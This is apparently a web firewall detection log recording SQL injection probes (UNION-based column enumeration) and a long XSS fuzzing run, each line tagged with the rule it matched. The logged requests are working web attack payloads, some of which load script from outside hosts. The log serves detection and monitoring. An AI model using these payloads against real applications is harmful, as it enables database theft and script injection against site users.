Thu Jun 20 00:00:14 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd AND 5954=2507-- nLPm&password=asd
Thu Jun 20 00:00:42 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x6f4e56756e436455657455634851715746536c4171636d4964494c4c435168694e4e776345424443,0x71767a7071),57,57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 57,CONCAT(0x7176717671,0x446c4d6a646149526a63597251566a5962506b5a5057747846556c41654c616b4a6c665948765143,0x71767a7071),57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 57,57,CONCAT(0x7176717671,0x63674f6945477864506a,0x71767a7071)-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT CONCAT(0x7176717671,0x5866557645554d695273,0x71767a7071),57,57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=asd' UNION ALL SELECT 57,CONCAT(0x7176717671,0x42787a7a4d484763676e,0x71767a7071),57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-8002' UNION ALL SELECT 57,CONCAT(0x7176717671,0x4b717968514e4264744a516b6a786a74574b68496c644c6d6242736b4767557a736f71634e414162,0x71767a7071),57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-7243' UNION ALL SELECT 57,57,CONCAT(0x7176717671,0x6478756c6849696e6241485063496653726c4b4d555a63514c4b774c6371587079634a4e636a626f,0x71767a7071)-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-5578' UNION ALL SELECT CONCAT(0x7176717671,0x6a4a5159636e544e6774574c53705764616e4768774d774f63536170414547497058474142796c66,0x71767a7071),57,57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-8405' UNION ALL SELECT 57,CONCAT(0x7176717671,0x4a6a416e78435a6b455a,0x71767a7071),57-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-2550' UNION ALL SELECT 57,57,CONCAT(0x7176717671,0x5553716651526d6c4a75,0x71767a7071)-- -&password=asd
Thu Jun 20 00:00:50 2024 - From: 192.168.193.130 | Match: [SQLi] | request: username=-7585' UNION ALL SELECT CONCAT(0x7176717671,0x646f6a4f526d4a58564b,0x71767a7071),57,57-- -&password=asd
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<;SCRIPT>;a=/XSS/
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi, xss_multiple_payload_detection] | request: query=&lt;&#34;&#39;;alert(String.fromCharCode(88,83,83))//\&#39;;alert(String.fromCharCode(88,83,83))//&#34;;alert(String.fromCharCode(88,83,83))//\&#34;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&#34;&gt;&#39;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;iFrAme/src=jaVascRipt:alert.bind()(1)+class=dalfox&gt;&lt;/iFramE&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<SCRIPT+onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<frameset+onScroll+frameset+onScroll="javascript:javascript:alert(1)"></frameset+onScroll>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;HEAD&gt;&lt;META+HTTP-EQUIV=\"CONTENT-TYPE\"+CONTENT=\"text/html;+charset=UTF-7\"&gt;+&lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<SCRIPT+SRC="%(jpg)s"></SCRIPT>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<meta+charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&amp;lt;LINK+REL=\&#34;stylesheet\&#34;+HREF=\&#34;javascript&amp;#058;alert(&#39;XSS&#39;);\&#34;&amp;gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, XSS_Payload_8] | request: query=<img+src\x13=x+onerror="javascript:alert(1)">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;;STYLE+TYPE=&#34;;text/javascript&#34;;&gt;;alert(&#39;;XSS&#39;;);&lt;;/STYLE&gt;;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;iframe+src=&#34;vbscript:document.vulnerable=true;&#34;&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;a+href=&#34;javas\x0Bcript:javascript:alert(1)&#34;+id=&#34;fuzzelement1&#34;&gt;test&lt;/a&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection, XSS_Payload_1] | request: query=--><!--+--\x3E>+<img+src=xxx:x+onerror=javascript:alert(1)>+-->
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=ABC<div+style="x:\x0Aexpression(javascript:alert(1)">DEF
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<xml+id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A+CLASS=XSS></A>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;;FRAMESET&gt;;&lt;;FRAME+SRC=&#34;;javascript:alert(&#39;;XSS&#39;;);&#34;;&gt;;&lt;;/FRAMESET&gt;;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<BGSOUND+SRC="javascript:alert('XSS');">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<a+href="\x11javascript:javascript:alert(1)"+id="fuzzelement1">test</a>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<img+src\x47=x+onerror="javascript:alert(1)">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<<script>document.vulnerable=true;</script>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<script+src=%(jscript)s></script>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=&lt;IMG+SRC=x+onplaying=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;STYLE&gt;.XSS{background-image:url(&#34;javascript:javascript:alert(1)&#34;);}&lt;/STYLE&gt;&lt;A+CLASS=XSS&gt;&lt;/A&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=ABC<div+style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query='"`><script>/*+*\x2Fjavascript:alert(1)//+*/</script>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=&lt;IMG+SRC=x+ondragend=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;IMG+SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=</script><script>alert('XSS');</script>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;embed+code=&#34;http://businessinfo.co.uk/labs/xss/xss.swf&#34;+allowscriptaccess=always&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi, xss_multiple_payload_detection] | request: query=&lt;!--#exec+cmd=&#34;/bin/echo+&#39;&lt;SCR&#39;&#34;--&gt;&lt;!--#exec+cmd=&#34;/bin/echo+&#39;IPT+SRC=http://www.securitycompass.com/xss.js&gt;&lt;/SCRIPT&gt;&#39;&#34;--&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<IMG+SRC=”javascript:alert(‘XSS’)”
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;sVg&gt;&lt;scRipt+&gt;alert&amp;lpar;1&amp;rpar;+{Opera}
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<script>Object.__noSuchMethod__+=+Function,[{}][0].constructor._('javascript:alert(1)')()</script>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;a+href=&#34;javas\x0Bcript:javascript:alert(1)&#34;+id=&#34;fuzzelement1&#34;&gt;test&lt;/a&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<meta+http-equiv="refresh"+content="0;url=javascript:confirm(1)">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<iframe+src=http://xss.rocks/scriptlet.html+<
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;video&gt;&lt;source+onerror=&#34;javascript:javascript:alert(1)&#34;&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=ABC<div+style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;TABLE&gt;&lt;TD+BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<LAYER+SRC="%(scriptlet)s"></LAYER>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<P+STYLE="behavior:url('#default#time2')"+end="0"+onEnd="javascript:alert(1)">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;;IMG+SRC=&#39;;vbscript:msgbox(&#34;;XSS&#34;;)&#39;;&gt;;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;form+id=&#34;test&#34;+/&gt;&lt;button+form=&#34;test&#34;+formaction=&#34;javascript:javascript:alert(1)&#34;&gt;X
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<embed+src="javascript:alert(1)">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<a+href="\xE2\x80\x87javascript:javascript:alert(1)"+id="fuzzelement1">test</a>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;OBJECT+TYPE=&#34;text/x-scriptlet&#34;+DATA=&#34;http://www.securitycompass.com/scriptlet.html&#34;&gt;&lt;/object&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [SQLi] | request: query=&lt;IMG+SRC=x+onhashchange=&#34;alert(String.fromCharCode(88,83,83))&#34;&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;SCRIPT&gt;a=/XSS/
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;a+href=&#34;\xE2\x80\x85javascript:javascript:alert(1)&#34;+id=&#34;fuzzelement1&#34;&gt;test&lt;/a&gt;
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<html+onMouseMove+html+onMouseMove="javascript:javascript:alert(1)"></html+onMouseMove>
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=&lt;HEAD&gt;&lt;META+HTTP-EQUIV=&quot;CONTENT-TYPE&quot;+CONTENT=&quot;text/html;+charset=UTF-7&quot;&gt;+&lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<img+src="javascript:alert(1)">
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=</svg>''<svg><script+'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29;+{Opera}
Thu Jun 20 00:27:13 2024 - From: 192.168.193.130 | Match: [xss_multiple_payload_detection] | request: query=<a+href="\x1Ajavascript:javascript:alert(1)"+id="fuzzelement1">test</a>
